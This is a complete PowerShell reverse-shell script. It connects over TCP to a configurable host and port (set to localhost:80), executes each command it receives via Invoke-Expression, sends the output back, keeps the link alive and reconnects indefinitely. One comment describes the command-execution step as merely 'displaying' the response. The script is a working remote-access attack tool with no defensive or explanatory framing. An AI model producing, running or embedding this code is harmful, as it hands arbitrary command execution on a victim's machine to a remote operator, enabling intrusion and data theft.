# Define the IP address and port to connect to
$remoteIP = "localhost"
$remotePort = 80
$encoding = [System.Text.Encoding]::UTF8

# Function to connect to the remote host
function ConnectToRemoteHost {
    while ($true) {
        try {
            # Create a TCP client to connect to the remote host
            $client = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
            break
        }
        catch {
            Write-Host "Connection Failed"
        }
    }
    return $client
}

# Function to send and receive data from the remote host
function SendReceiveData($stream, $writer, $secondsWithoutCommand) {
    while ($stream.DataAvailable) {
        # Wait for a response from the remote host
        $buffer = New-Object byte[] 1024
        $bytesRead = $stream.Read($buffer, 0, 1024)
        $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
    
        # Display the response from the remote host
        $output = Invoke-Expression $command

        # Format the output for display
        $formattedOutput = $output | Format-Table -AutoSize | Out-String
        $formattedOutput = $formattedOutput + ":terminate"

        # Send the command to the remote host
        $writer.WriteLine($formattedOutput)
        $writer.Flush()

        $secondsWithoutCommand = 0
    }

    if ($secondsWithoutCommand -ge 10) {
        # Attempt to send a message to the client to check if it's still connected
        try {
            $writer.WriteLine(":keep alive")
            $writer.Flush()
            $secondsWithoutCommand = 0
        }
        catch [System.IO.IOException] {
            # The message failed to send, indicating that the client is no longer connected
            Write-Host "Connection Lost... retrying"
            return $true, $secondsWithoutCommand
        }
    } 

    Start-Sleep -Milliseconds (500)
    $secondsWithoutCommand += .5
    return $false, $secondsWithoutCommand
}

while ($true) {

    # Connect to the remote host
    $client = ConnectToRemoteHost

    # Get the stream to write outgoing data to the remote host
    $stream = $client.GetStream()

    # Create a StreamWriter object to write data to the stream
    $writer = New-Object System.IO.StreamWriter($stream, $encoding)

    while ($true) {
        $connectionFailed, $secondsWithoutCommand = SendReceiveData $stream $writer $secondsWithoutCommand
        if ($connectionFailed) {
            $client.Close()
            break
        }
    }
}
